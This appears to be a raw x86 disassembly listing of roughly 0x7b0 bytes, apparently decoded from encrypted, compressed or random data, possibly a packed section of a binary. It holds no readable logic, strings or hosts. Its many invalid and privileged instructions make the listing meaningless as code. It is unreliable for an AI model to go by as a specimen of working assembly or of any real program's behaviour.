  404f31:	fisubr DWORD PTR [ebp-0x45]
  404f34:	shrd   DWORD PTR [eax-0x58],esp,cl
  404f38:	adc    al,0x7c
  404f3a:	and    BYTE PTR [edi+0xd8e8450],0xdb
  404f41:	(bad)  
  404f42:	popa   
  404f43:	enter  0xf1d0,0xbd
  404f47:	daa    
  404f48:	xor    dl,BYTE PTR [edi-0x392ab372]
  404f4e:	or     cl,bl
  404f50:	adc    DWORD PTR [edi+0x52f0b81b],ebp
  404f56:	frstor ds:0x5396314b
  404f5c:	je     0x404f34
  404f5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f5f:	or     BYTE PTR [esi+0x3ca38b94],ah
  404f65:	(bad)  
  404f66:	adc    cl,BYTE PTR [esp+edi*8]
  404f69:	pop    esi
  404f6a:	sbb    esp,DWORD PTR cs:[eax+0x1ff0fdc0]
  404f71:	popa   
  404f72:	fwait
  404f73:	xor    bl,BYTE PTR [ecx]
  404f75:	test   BYTE PTR [ecx+0x58],ch
  404f78:	inc    edi
  404f79:	mov    ch,0x9a
  404f7b:	adc    al,0x4b
  404f7d:	xor    ecx,eax
  404f7f:	cdq    
  404f80:	dec    edi
  404f81:	pop    ecx
  404f82:	enter  0xfd93,0xd3
  404f86:	scas   al,BYTE PTR es:[edi]
  404f87:	test   BYTE PTR [ebx+0x3c1dc90c],ch
  404f8d:	add    al,0x87
  404f8f:	enter  0x64c1,0x5c
  404f93:	in     al,0x65
  404f95:	push   0xa5cc6818
  404f9a:	inc    edx
  404f9b:	cli    
  404f9c:	sbb    DWORD PTR [edi+eax*2],ecx
  404f9f:	int3   
  404fa0:	inc    esi
  404fa1:	ror    BYTE PTR [eax+0x2d4810b0],1
  404fa7:	xchg   esp,eax
  404fa8:	mov    dl,0xde
  404faa:	out    dx,eax
  404fab:	push   ds
  404fac:	adc    edi,esp
  404fae:	mov    ebp,0x5b1a6388
  404fb3:	mov    cl,0x3e
  404fb5:	xchg   edi,eax
  404fb6:	inc    esi
  404fb7:	xchg   DWORD PTR [ebp-0x55],ebp
  404fba:	fmul   DWORD PTR es:[ebx-0x4]
  404fbe:	pop    ebp
  404fbf:	fstp   QWORD PTR [ebx]
  404fc1:	sbb    edi,eax
  404fc3:	pushf  
  404fc4:	mov    ?,edi
  404fc6:	inc    ecx
  404fc7:	mov    dh,0xec
  404fc9:	aaa    
  404fca:	push   cs
  404fcb:	adc    bl,BYTE PTR [edi+ebx*4+0xb14f4e7]
  404fd2:	outs   dx,BYTE PTR ds:[esi]
  404fd3:	mov    edx,DWORD PTR [ecx+0x74]
  404fd6:	pusha  
  404fd7:	aam    0x8f
  404fd9:	cmp    al,BYTE PTR [ebp-0x4d5db833]
  404fdf:	and    edx,esi
  404fe1:	or     BYTE PTR [edi+ebp*8],ah
  404fe4:	stos   BYTE PTR es:[edi],al
  404fe5:	loopne 0x404f83
  404fe7:	(bad)  
  404fe8:	idiv   BYTE PTR [edi+0x4c]
  404feb:	add    ah,BYTE PTR [ebx+0x610a0329]
  404ff1:	cmp    eax,DWORD PTR [ebp-0x1d]
  404ff4:	das    
  404ff5:	in     al,0xd8
  404ff7:	stos   DWORD PTR es:[edi],eax
  404ff8:	jo     0x404ffc
  404ffa:	add    BYTE PTR [edx],bl
  404ffc:	mov    al,0x44
  404ffe:	or     al,0x68
  405000:	sbb    DWORD PTR [edi],esp
  405002:	xor    ebx,DWORD PTR [eax+0x6e]
  405005:	mov    ds:0xcc0941c1,eax
  40500a:	dec    esp
  40500b:	mov    ebp,0xf6facf13
  405010:	ins    BYTE PTR es:[edi],dx
  405011:	sbb    DWORD PTR [esi],edx
  405013:	sub    edi,ebp
  405015:	xor    BYTE PTR [eax+eiz*4-0x2f],cl
  405019:	sub    ecx,edi
  40501b:	hlt    
  40501c:	mov    ecx,0x50812c42
  405021:	mov    DWORD PTR [esi-0x1b],ebp
  405024:	(bad)  
  405025:	mov    eax,0xf096247a
  40502a:	cmp    al,0xbc
  40502c:	in     eax,0x4b
  40502e:	dec    ebx
  40502f:	or     al,0x41
  405031:	jl     0x405035
  405033:	repz xchg edx,eax
  405035:	push   ds
  405036:	iret   
  405037:	adc    BYTE PTR [edx],cl
  405039:	das    
  40503a:	out    0xa,eax
  40503c:	lds    esi,FWORD PTR [ebx-0x6d]
  40503f:	xor    esi,DWORD PTR [edx]
  405041:	cld    
  405042:	inc    esp
  405043:	inc    edx
  405044:	dec    eax
  405045:	cli    
  405046:	dec    eax
  405047:	mov    dl,0xf7
  405049:	and    bl,BYTE PTR [edx+0x2ff7d9a2]
  40504f:	inc    esp
  405050:	dec    edx
  405051:	cdq    
  405052:	push   ecx
  405053:	mov    WORD PTR [edi-0x21a67f22],gs
  405059:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40505a:	pop    ebp
  40505b:	or     BYTE PTR [ebp-0x5eab626a],0x14
  405062:	inc    ebx
  405063:	add    cl,ch
  405065:	and    BYTE PTR [ecx+0x63d9b556],al
  40506b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40506c:	shr    ch,cl
  40506e:	in     al,dx
  40506f:	cdq    
  405070:	jp     0x405026
  405072:	test   eax,0x29ca169d
  405077:	jl     0x40501e
  405079:	mov    dh,BYTE PTR [ebp-0x6b]
  40507c:	mov    al,0xf0
  40507e:	or     BYTE PTR [edi+esi*4],bl
  405081:	stos   BYTE PTR es:[edi],al
  405082:	mov    dl,0x4e
  405084:	xlat   BYTE PTR ds:[ebx]
  405085:	test   BYTE PTR [ecx],dl
  405087:	mov    al,ds:0x6d4aa6c8
  40508c:	repz jmp 0x40507d
  40508f:	addr16 cmc 
  405091:	pusha  
  405092:	mov    al,ds:0xcdd2d8a9
  405097:	xchg   ebx,eax
  405098:	(bad)  
  405099:	aam    0x62
  40509b:	sbb    bl,BYTE PTR [esi]
  40509d:	add    al,0x64
  40509f:	xchg   BYTE PTR [esi+0xbd60de5],cl
  4050a5:	in     al,0xd0
  4050a7:	and    edx,ebp
  4050a9:	mov    esp,0xfed62ae3
  4050ae:	jmp    0xe6ad:0x18c7e63d
  4050b5:	arpl   WORD PTR [ebp-0x37f4a034],di
  4050bb:	fiadd  DWORD PTR [bp+0x22]
  4050bf:	xor    al,0xb3
  4050c1:	xor    DWORD PTR [eax-0x421c3d22],esi
  4050c7:	xor    eax,0xba8f486c
  4050cc:	adc    eax,0xbc997124
  4050d1:	rol    BYTE PTR [edx+0x6e025e63],1
  4050d7:	dec    esp
  4050d8:	adc    edx,DWORD PTR [edi+0x162d777b]
  4050de:	in     al,0x39
  4050e0:	lods   eax,DWORD PTR ds:[esi]
  4050e1:	xor    al,0x32
  4050e3:	sbb    ebx,eax
  4050e5:	jne    0x40514a
  4050e7:	mov    bh,0x84
  4050e9:	adc    ebp,ebx
  4050eb:	jecxz  0x4050b1
  4050ed:	out    0x0,al
  4050ef:	xchg   edx,eax
  4050f0:	stos   BYTE PTR es:[edi],al
  4050f1:	xchg   ecx,eax
  4050f2:	repz pop ecx
  4050f4:	daa    
  4050f5:	jnp    0x405136
  4050f7:	shl    bh,1
  4050f9:	(bad)  
  4050fa:	sub    ecx,DWORD PTR [edx]
  4050fc:	cmp    DWORD PTR [ebx+0x3d],edx
  4050ff:	add    dh,BYTE PTR [edi+eiz*2+0x56]
  405103:	scas   eax,DWORD PTR es:[edi]
  405104:	fiadd  WORD PTR [eax-0x44]
  405107:	fstp   TBYTE PTR fs:0x43a682a9
  40510f:	cmp    dl,cl
  405111:	(bad)  
  405112:	cli    
  405113:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405114:	leave  
  405115:	add    DWORD PTR [edi],esp
  405117:	ins    DWORD PTR es:[edi],dx
  405118:	(bad)  
  405119:	mov    ebp,0x4a49561e
  40511e:	(bad)
  405121:	hlt    
  405122:	mov    ds:0xba6bfa03,al
  405127:	fldenv ds:0x2a64dbee
  40512d:	sub    eax,0x1e5ce821
  405132:	(bad)  
  405133:	jmp    0x6edf:0x718eba9a
  40513a:	aaa    
  40513b:	stos   BYTE PTR es:[edi],al
  40513c:	(bad)  
  40513d:	ja     0x40517a
  40513f:	add    BYTE PTR [edi+0x7e393811],al
  405145:	mov    eax,ds:0x5aa58343
  40514a:	mov    ds:0x69c28583,al
  40514f:	cmc    
  405150:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405151:	aad    0xf2
  405153:	mov    cl,BYTE PTR [edi+0x362c95e]
  405159:	inc    edx
  40515a:	adc    al,0x1d
  40515c:	enter  0xf756,0x87
  405160:	stos   DWORD PTR es:[edi],eax
  405161:	ret    
  405162:	cmp    BYTE PTR [ebx-0x63b1ce5d],ch
  405168:	repnz loopne 0x4051e6
  40516b:	in     eax,0xcd
  40516d:	push   ebp
  40516e:	loope  0x4051aa
  405170:	xlat   BYTE PTR ds:[ebx]
  405171:	mov    edx,0x8209a5c4
  405176:	aad    0x91
  405178:	aam    0x26
  40517a:	push   esp
  40517b:	push   0x19
  40517d:	scas   eax,DWORD PTR es:[edi]
  40517e:	addr16 or eax,0x8a448172
  405184:	fidivr WORD PTR [ebx-0x74]
  405187:	jecxz  0x405155
  405189:	cmc    
  40518a:	mov    eax,0x7caa42d9
  40518f:	push   es
  405190:	mov    ecx,0x7e7aceea
  405195:	xchg   DWORD PTR ds:0x538253ef,ecx
  40519b:	sbb    ah,BYTE PTR [ebx+0x2]
  40519e:	dec    ecx
  40519f:	in     al,dx
  4051a0:	aaa    
  4051a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051a2:	push   es
  4051a3:	mov    BYTE PTR [ecx],0x26
  4051a6:	mov    DWORD PTR ds:0x385e6497,esp
  4051ac:	sub    al,0x7f
  4051ae:	xchg   cl,ch
  4051b0:	pop    edi
  4051b1:	or     eax,0x27469726
  4051b6:	scas   al,BYTE PTR es:[edi]
  4051b7:	retf   0xd6c4
  4051ba:	cmp    eax,0xe586c941
  4051bf:	xchg   ecx,eax
  4051c0:	ds xchg edi,eax
  4051c2:	add    al,0x95
  4051c4:	pop    ebp
  4051c5:	jmp    0x91d4:0x4b8a22d1
  4051cc:	xlat   BYTE PTR ds:[ebx]
  4051cd:	retf   0x968
  4051d0:	inc    edx
  4051d1:	mov    dl,0x58
  4051d3:	add    esp,DWORD PTR [edx-0x21]
  4051d6:	push   ss
  4051d7:	in     eax,0xdd
  4051d9:	frstpm(287 only) 
  4051db:	add    BYTE PTR [esi+0x29316885],dl
  4051e1:	xlat   BYTE PTR ds:[ebx]
  4051e2:	mov    DWORD PTR [ecx+0x52],edi
  4051e5:	cdq    
  4051e6:	cmp    bl,bh
  4051e8:	stc    
  4051e9:	jae    0x405246
  4051eb:	add    DWORD PTR [eax+0x79],edx
  4051ee:	sub    BYTE PTR [eax-0x65754ac9],dl
  4051f4:	xor    BYTE PTR [ecx-0x7af72dab],0x10
  4051fb:	fwait
  4051fc:	mov    edx,0x383f705c
  405201:	les    edx,FWORD PTR [ecx]
  405203:	cwde   
  405204:	jnp    0x4051b2
  405206:	push   ds
  405207:	or     BYTE PTR [edi],0x41
  40520a:	push   ecx
  40520b:	fs cli 
  40520d:	test   eax,0xfcd7e707
  405212:	push   es
  405213:	sahf   
  405214:	test   DWORD PTR [eax],esi
  405216:	sub    ecx,ecx
  405218:	jae    0x405247
  40521a:	adc    ecx,ecx
  40521c:	sbb    eax,0xb1fec5a4
  405221:	inc    esp
  405222:	cs ret 
  405224:	scas   eax,DWORD PTR es:[edi]
  405225:	test   eax,0xc576d9eb
  40522a:	or     DWORD PTR [ecx+0x36b9e569],edx
  405230:	lods   al,BYTE PTR ds:[esi]
  405231:	xor    eax,DWORD PTR [edx-0x270f027c]
  405237:	push   ds
  405238:	(bad)  [ebp-0x42]
  40523b:	mov    al,0x60
  40523d:	pop    esi
  40523e:	stc    
  40523f:	out    0x16,al
  405241:	pop    edx
  405242:	mov    ds:0xc504c213,al
  405247:	xor    eax,0xcf5461f9
  40524c:	scas   eax,DWORD PTR es:[edi]
  40524d:	es mov al,cl
  405250:	push   ss
  405251:	imul   esp,DWORD PTR [eax],0x9
  405254:	gs iret 
  405256:	es xor ebx,ebp
  405259:	xor    DWORD PTR [ebx-0x2d00fa51],esp
  40525f:	xchg   ebx,eax
  405260:	adc    eax,0x37c6f569
  405265:	test   eax,0x9402e60a
  40526a:	push   0x6c2f8922
  40526f:	push   esp
  405270:	jb     0x4052b9
  405272:	scas   eax,DWORD PTR es:[edi]
  405273:	jp     0x4051f5
  405275:	mov    ah,0x9a
  405277:	sbb    al,0x8b
  405279:	sub    ch,BYTE PTR [eax]
  40527b:	lock xchg esi,eax
  40527d:	mov    ah,0x11
  40527f:	into   
  405280:	lea    esi,[ebx+ecx*8+0x61]
  405284:	push   ds
  405285:	mov    bh,0x15
  405287:	pop    esi
  405288:	scas   al,BYTE PTR es:[edi]
  405289:	loop   0x405221
  40528b:	lods   al,BYTE PTR ds:[esi]
  40528c:	ror    BYTE PTR [edi+edi*8],1
  40528f:	and    edx,DWORD PTR [edx-0x35ca804d]
  405295:	sub    ebp,DWORD PTR [edx]
  405297:	outs   dx,BYTE PTR ds:[esi]
  405298:	mov    eax,ds:0xadc4cac4
  40529d:	inc    ebx
  40529e:	xchg   edx,eax
  40529f:	int    0x9f
  4052a1:	hlt    
  4052a2:	bound  ebx,QWORD PTR [edx]
  4052a4:	repz test al,0x5
  4052a7:	mov    bh,0x45
  4052a9:	popf   
  4052aa:	inc    esi
  4052ab:	imul   edi,esp,0x56
  4052ae:	adc    al,0xb1
  4052b0:	out    0x60,eax
  4052b2:	mov    ebx,0x4ed299b8
  4052b7:	cli    
  4052b8:	mov    eax,DWORD PTR [esi+eax*8-0x63]
  4052bc:	push   0xc7dfb3af
  4052c1:	ins    DWORD PTR es:[edi],dx
  4052c2:	out    0x2f,al
  4052c4:	ins    DWORD PTR es:[edi],dx
  4052c5:	adc    BYTE PTR [ebp-0x72],al
  4052c8:	mov    ds:0xa3f9e4c7,al
  4052cd:	push   cs
  4052ce:	sbb    DWORD PTR [edi],esp
  4052d0:	bt     DWORD PTR [ecx],eax
  4052d3:	pop    eax
  4052d4:	stos   BYTE PTR es:[edi],al
  4052d5:	or     ecx,ebp
  4052d7:	dec    eax
  4052d8:	pop    esi
  4052d9:	imul   esi,DWORD PTR [esi+0x2d],0x7f
  4052dd:	mov    BYTE PTR [esi+ebx*2+0x10d40443],dl
  4052e4:	push   ecx
  4052e5:	add    ebx,DWORD PTR [ebp-0x24b511b8]
  4052eb:	dec    ebp
  4052ec:	push   ds
  4052ed:	cmp    edx,edx
  4052ef:	xor    eax,0xd1751358
  4052f4:	aam    0x51
  4052f6:	sub    esp,DWORD PTR [ebp-0x12]
  4052f9:	adc    al,0x2d
  4052fb:	sahf   
  4052fc:	xor    al,0x54
  4052fe:	fistp  WORD PTR [ebp+0x5c]
  405301:	adc    eax,0xd08501a1
  405306:	test   DWORD PTR [esi+0x7c],0x7008f097
  40530d:	fcomp  QWORD PTR [edi]
  40530f:	jge    0x405378
  405311:	adc    eax,0xd67e742e
  405316:	add    al,0xcb
  405318:	mov    ds:0x8668e5e,al
  40531d:	push   ebx
  40531f:	xor    ebx,ecx
  405321:	mov    eax,ds:0x322c359f
  405326:	sub    BYTE PTR [ebx+0x68],0xf7
  40532a:	xchg   DWORD PTR [ecx+0x72424ec2],esi
  405330:	and    dh,BYTE PTR [edx+0x2d4404a1]
  405336:	pusha  
  405337:	(bad)  
  405338:	stos   DWORD PTR es:[edi],eax
  405339:	pmaxsw mm0,mm4
  40533c:	lock test al,0xb2
  40533f:	inc    ebx
  405340:	push   eax
  405341:	add    edi,DWORD PTR [ecx*1+0x358fae60]
  405348:	sti    
  405349:	xor    eax,0x9271dc7
  40534f:	xchg   edi,eax
  405350:	push   ebx
  405351:	ja     0x405327
  405353:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405354:	and    al,0x7f
  405356:	inc    ebx
  405357:	push   0xffffffc9
  405359:	add    bl,BYTE PTR [edi-0x3daccc61]
  40535f:	das    
  405360:	daa    
  405361:	je     0x405350
  405363:	scas   eax,DWORD PTR es:[edi]
  405364:	mov    ecx,0x4f2833b2
  405369:	ss mov al,0x45
  40536c:	push   edx
  40536d:	(bad)  
  40536e:	xor    DWORD PTR [ebp+eiz*1+0x32],ebp
  405372:	mov    ch,0xa5
  405374:	cmp    edx,DWORD PTR [edi+0x5f]
  405377:	add    ecx,DWORD PTR [esp]
  40537a:	fisttp WORD PTR [eax]
  40537c:	outs   dx,BYTE PTR ds:[esi]
  40537d:	iret   
  40537e:	jl     0x405368
  405380:	pop    edi
  405381:	push   edx
  405382:	jbe    0x40534c
  405384:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405385:	clc    
  405386:	pop    edi
  405387:	pop    ss
  405388:	loope  0x405373
  40538a:	cmp    dh,dl
  40538c:	push   ds
  40538d:	out    dx,al
  40538e:	add    bl,BYTE PTR [edx-0x7fab43cf]
  405394:	and    DWORD PTR [ebp+0x72ccf34f],eax
  40539a:	or     dl,dl
  40539c:	xchg   edi,eax
  40539d:	pop    ds
  40539e:	inc    edi
  40539f:	mov    ebp,ecx
  4053a1:	enter  0x2636,0xad
  4053a5:	mov    dl,0xa2
  4053a7:	sub    DWORD PTR [edi+0x52],esp
  4053aa:	(bad)  
  4053ab:	leave  
  4053ac:	(bad)  
  4053ad:	das    
  4053ae:	out    dx,eax
  4053af:	ins    DWORD PTR es:[edi],dx
  4053b0:	fimul  WORD PTR [edx-0x1d]
  4053b3:	dec    esp
  4053b4:	out    dx,al
  4053b5:	data16 das 
  4053b7:	jp     0x4053f3
  4053b9:	in     al,0xf8
  4053bb:	sti    
  4053bc:	mov    al,0x35
  4053be:	test   BYTE PTR ds:[esi+0x382f5192],cl
  4053c5:	or     esi,ebx
  4053c7:	into   
  4053c8:	in     eax,0x47
  4053ca:	inc    esp
  4053cb:	jg     0x40542d
  4053cd:	cmp    eax,0xdfe13f4f
  4053d2:	and    BYTE PTR [edi-0x6e55beab],bl
  4053d8:	push   esp
  4053d9:	dec    esp
  4053da:	inc    ebx
  4053db:	push   0xffffffdf
  4053dd:	(bad)  
  4053de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053df:	push   ds
  4053e0:	(bad)  
  4053e2:	or     ch,0xc5
  4053e5:	jo     0x4053ef
  4053e7:	imul   esp,DWORD PTR [eax-0x64],0x95967e2c
  4053ee:	hlt    
  4053ef:	inc    edi
  4053f0:	sbb    al,0xd2
  4053f3:	lahf   
  4053f4:	xor    al,0xad
  4053f6:	scas   eax,DWORD PTR es:[edi]
  4053f7:	shr    ah,0xc5
  4053fa:	in     eax,0xae
  4053fc:	mov    ch,0x50
  4053fe:	fistp  DWORD PTR [ebp+0x76df7255]
  405404:	mov    BYTE PTR [edx+0x16],al
  405407:	jmp    0x405424
  405409:	jnp    0x405418
  40540b:	cli    
  40540c:	jbe    0x4053b3
  40540e:	xor    ah,dl
  405410:	(bad)  
  405411:	ss aam 0xbc
  405414:	pop    edi
  405415:	or     ch,dl
  405417:	mov    esi,0x6d47a475
  40541c:	fs push ss
  40541e:	add    bl,bh
  405420:	push   esi
  405421:	es ret 0xca5d
  405425:	stc    
  405426:	rol    ecx,0x5f
  405429:	das    
  40542a:	jb     0x40544b
  40542c:	sbb    BYTE PTR [edx+0x5b],bh
  40542f:	lods   eax,DWORD PTR ds:[esi]
  405430:	ja     0x4053e8
  405432:	cmp    BYTE PTR [edi-0x2e],ch
  405435:	addr16 push esi
  405437:	fs mov al,0xe4
  40543a:	inc    ecx
  40543b:	out    dx,eax
  40543c:	ds adc al,0x12
  40543f:	scas   al,BYTE PTR es:[edi]
  405440:	pop    ebp
  405441:	outs   dx,DWORD PTR ds:[esi]
  405442:	and    edx,DWORD PTR [ecx+0x37]
  405445:	pop    edx
  405446:	out    0xc9,eax
  405448:	cmp    al,0xdd
  40544a:	arpl   bp,sp
  40544c:	retf   0x6afc
  40544f:	ins    BYTE PTR es:[edi],dx
  405450:	pause  
  405452:	xlat   BYTE PTR ds:[ebx]
  405453:	lahf   
  405454:	out    dx,eax
  405455:	daa    
  405456:	dec    ebp
  405457:	iret   
  405458:	or     al,0x9b
  40545a:	(bad)  
  40545b:	fdivr  DWORD PTR [esi]
  40545d:	(bad)  [edi-0x52c295fe]
  405463:	aas    
  405464:	and    ecx,DWORD PTR [ebx-0x6f6ebcb1]
  40546a:	lds    eax,FWORD PTR [eax-0x75]
  40546d:	fistp  QWORD PTR [ecx]
  40546f:	push   esi
  405470:	pushf  
  405471:	stos   BYTE PTR es:[edi],al
  405472:	popf   
  405473:	div    BYTE PTR [ebp+0x7d]
  405476:	lods   al,BYTE PTR ds:[esi]
  405477:	push   esi
  405478:	jns    0x4054d2
  40547a:	pop    edi
  40547b:	aas    
  40547c:	pop    ebp
  40547d:	push   cs
  40547e:	jmp    0x815360a9
  405483:	inc    ebp
  405484:	adc    al,0x5b
  405486:	pop    eax
  405487:	add    al,ah
  405489:	bound  edx,QWORD PTR [ebp-0x2a]
  40548c:	xchg   ebp,eax
  40548d:	or     dl,BYTE PTR [ebp-0x5a]
  405490:	push   0x869b7e78
  405495:	retf   0x1c78
  405498:	fldpi  
  40549a:	pop    es
  40549b:	jne    0x4054ac
  40549d:	push   ebp
  40549e:	push   edx
  40549f:	dec    edi
  4054a0:	pusha  
  4054a1:	or     eax,0xd729047
  4054a6:	fstp   TBYTE PTR [edx-0x38bdb498]
  4054ac:	lea    ebp,[edx]
  4054ae:	push   esp
  4054af:	mov    cl,0x31
  4054b1:	mov    eax,0xa0eff9e7
  4054b6:	adc    BYTE PTR [eax-0x662603b1],ch
  4054bc:	js     0x405511
  4054be:	inc    edi
  4054bf:	cld    
  4054c0:	jne    0x40548f
  4054c2:	cmp    eax,0xe8123a4e
  4054c7:	fist   WORD PTR [esi-0x7120ac6c]
  4054cd:	dec    ebx
  4054ce:	lahf   
  4054cf:	into   
  4054d0:	mov    bl,0x8e
  4054d2:	push   ebp
  4054d3:	sbb    eax,0x87eb397f
  4054d8:	cmp    ebp,DWORD PTR [edx]
  4054da:	adc    DWORD PTR ds:0x76cf73dc,0xffffff8a
  4054e1:	inc    ebp
  4054e2:	mov    DWORD PTR [edx],eax
  4054e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054e5:	test   dh,bl
  4054e7:	sbb    eax,0x3a1734f7
  4054ec:	loope  0x4054e7
  4054ee:	outs   dx,BYTE PTR ds:[esi]
  4054ef:	(bad)  
  4054f0:	mov    ebp,?
  4054f2:	mov    al,0x8b
  4054f4:	add    eax,DWORD PTR [ecx]
  4054f6:	mov    cl,0xdb
  4054f8:	rol    DWORD PTR [edi-0x3ae84750],1
  4054fe:	cmp    BYTE PTR [edx],0xad
  405501:	imul   ebx,DWORD PTR [edi],0xc2be7dbb
  405507:	arpl   WORD PTR [eax+0x70],ax
  40550a:	sub    esp,eax
  40550c:	mov    ecx,0xfa296ad0
  405511:	jg     0x405547
  405513:	mov    bh,0xec
  405515:	test   BYTE PTR [edi+0x60],al
  405518:	(bad)  
  405519:	clc    
  40551a:	jp     0x405591
  40551c:	push   ss
  40551d:	push   ebx
  40551e:	int    0x22
  405520:	ret    0x7369
  405523:	or     al,0x60
  405525:	mov    eax,DWORD PTR [edi]
  405527:	pop    eax
  405528:	scas   eax,DWORD PTR es:[edi]
  405529:	sbb    al,0x26
  40552b:	scas   al,BYTE PTR es:[edi]
  40552c:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40552e:	sub    esi,DWORD PTR ss:[eax-0x7c]
  405532:	push   esi
  405533:	daa    
  405534:	cwde   
  405535:	jmp    0x1df1:0x175caacf
  40553c:	fxch   st(3)
  40553e:	and    ecx,DWORD PTR [eax]
  405540:	fsubr  DWORD PTR [ebp+0x54]
  405543:	daa    
  405544:	sbb    eax,DWORD PTR [ebp+0xee9da21]
  40554a:	cmp    al,0x31
  40554c:	dec    ebx
  40554d:	add    bl,BYTE PTR [ebx+0x5a90924]
  405553:	sbb    BYTE PTR [ecx+0x325452ee],dh
  405559:	loopne 0x4055c4
  40555b:	pop    ebx
  40555c:	mov    bh,bh
  40555e:	and    edx,DWORD PTR [ebx+0x143a08f8]
  405564:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405565:	or     DWORD PTR [edx+0x31b83750],ecx
  40556b:	add    BYTE PTR ds:0xf5b597ed,ah
  405571:	push   0x1e
  405573:	cli    
  405574:	test   DWORD PTR [esi],ebx
  405576:	add    al,0x58
  405578:	loope  0x40559b
  40557a:	pop    ss
  40557b:	out    dx,eax
  40557c:	push   es
  40557d:	and    esp,DWORD PTR [ebp+0x18]
  405580:	add    ebp,0x3c276172
  405586:	hlt    
  405587:	cs in  al,0x16
  40558a:	or     ebp,DWORD PTR [edi-0x3d74e936]
  405590:	dec    esp
  405591:	inc    eax
  405592:	test   eax,0xbdb16909
  405597:	test   BYTE PTR [eax],ah
  405599:	gs stos DWORD PTR es:[edi],eax
  40559b:	sbb    bh,ah
  40559d:	ins    DWORD PTR es:[edi],dx
  40559e:	or     BYTE PTR [edx+0x8],cl
  4055a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055a2:	(bad)  
  4055a3:	sbb    DWORD PTR [ecx-0x20d7df03],ebx
  4055a9:	(bad)  
  4055aa:	sub    al,0x80
  4055ac:	xchg   ecx,eax
  4055ad:	mov    ds:0x5a7fae41,eax
  4055b2:	in     eax,0x56
  4055b4:	sub    eax,0xb94b12cd
  4055b9:	mov    DWORD PTR [esi+0x5a2e9dd3],ecx
  4055bf:	jl     0x4055be
  4055c1:	sti    
  4055c2:	in     al,0x94
  4055c4:	pop    ss
  4055c5:	cwde   
  4055c6:	sub    ah,BYTE PTR ds:0x9f02214d
  4055cc:	jmp    0x1523bc66
  4055d1:	adc    dl,BYTE PTR [eax-0x34]
  4055d4:	mov    al,ds:0x4ca7be15
  4055d9:	fbld   TBYTE PTR [ebp-0x80]
  4055dc:	or     bh,dh
  4055de:	retf   
  4055df:	aam    0x2
  4055e1:	dec    esp
  4055e2:	mov    ebp,0x8245c44f
  4055e7:	lock or DWORD PTR [eax-0x3db56c5f],0xffffffff
  4055ef:	mov    ebx,0xbcc4dd9
  4055f4:	mov    ebp,0x614d51b7
  4055f9:	ror    ch,1
  4055fb:	jecxz  0x4055b0
  4055fd:	aad    0xed
  4055ff:	out    dx,al
  405600:	in     al,dx
  405601:	inc    BYTE PTR [edi+0x40a872b]
  405607:	ins    DWORD PTR es:[edi],dx
  405608:	shr    BYTE PTR [edi-0x1f],0xc3
  40560c:	pop    esi
  40560d:	mov    ds:0xe1a77c4b,al
  405612:	mov    ebp,0x7eed9697
  405617:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405618:	add    ah,ch
  40561a:	push   ecx
  40561b:	(bad)  
  40561c:	adc    BYTE PTR [edi+0x4f],ch
  40561f:	push   esi
  405620:	fdiv   DWORD PTR [edi+0x412caa6c]
  405626:	sbb    eax,0xb2ba25de
  40562b:	jge    0x405654
  40562d:	jmp    0x15dc:0x2ed50200
  405634:	test   BYTE PTR [ebx+edi*2+0x7f],al
  405638:	or     ecx,DWORD PTR [ecx]
  40563a:	int    0xe2
  40563c:	push   eax
  40563d:	dec    edx
  40563e:	loopne 0x4055c5
  405640:	pop    eax
  405641:	push   ecx
  405642:	rcl    BYTE PTR [edi+eax*2],1
  405645:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405646:	xchg   ecx,eax
  405647:	(bad)  
  405648:	jle    0x4056a9
  40564a:	call   0x1d23:0x3b1bcf26
  405651:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405652:	adc    al,0x97
  405654:	popa   
  405655:	cmp    dh,dl
  405657:	loop   0x4056ae
  405659:	mov    eax,0x888a1cd1
  40565e:	cmp    cl,bh
  405660:	clc    
  405661:	out    0x58,eax
  405663:	std    
  405664:	test   al,0x64
  405666:	xor    edx,DWORD PTR [esi+0x1570a0e7]
  40566c:	inc    ecx
  40566d:	int3   
  40566e:	(bad)  
  405670:	xor    edx,eax
  405672:	out    0xc,al
  405674:	retf   0x7651
  405677:	repnz ror al,cl
  40567a:	aad    0xe0
  40567c:	push   cs
  40567d:	mov    eax,?
  40567f:	and    BYTE PTR [esi-0x60941d6b],ch
  405685:	dec    esp
  405686:	mov    ecx,0x47820f3d
  40568b:	jns    0x4056cc
  40568d:	adc    eax,0xcc0ab5cd
  405692:	ss loopne 0x405712
  405695:	in     eax,dx
  405696:	adc    eax,0xb83378a7
  40569b:	(bad)  
  40569c:	xor    al,0x3a
  40569e:	adc    eax,0x1949aee8
  4056a3:	retf   0x7d9f
  4056a6:	inc    esp
  4056a7:	sbb    bl,dh
  4056a9:	xor    BYTE PTR [edx-0x409eac39],cl
  4056af:	addr16 repz push ebp
  4056b2:	push   edi
  4056b3:	push   ebp
  4056b4:	bound  eax,QWORD PTR [ebp-0x5b0e42da]
  4056ba:	mov    al,0xa7
  4056bc:	sbb    DWORD PTR [ecx],edx
  4056be:	lahf   
  4056bf:	data16 loop 0x4056db
  4056c2:	xor    dh,al
  4056c4:	dec    eax
  4056c5:	stc    
  4056c6:	jns    0x4056cd
  4056c8:	or     eax,0x9736e99a
  4056cd:	mov    dl,0xf2
  4056cf:	dec    esi
  4056d0:	inc    eax
  4056d1:	pop    ds
  4056d2:	jge    0x405693
  4056d4:	std    
  4056d5:	(bad)  
  4056d6:	aam    0x59
  4056d8:	test   DWORD PTR ds:0x4b45750b,edi
  4056de:	cmp    eax,0x85cc50d5
  4056e3:	xor    DWORD PTR [ebp-0x79],ebx
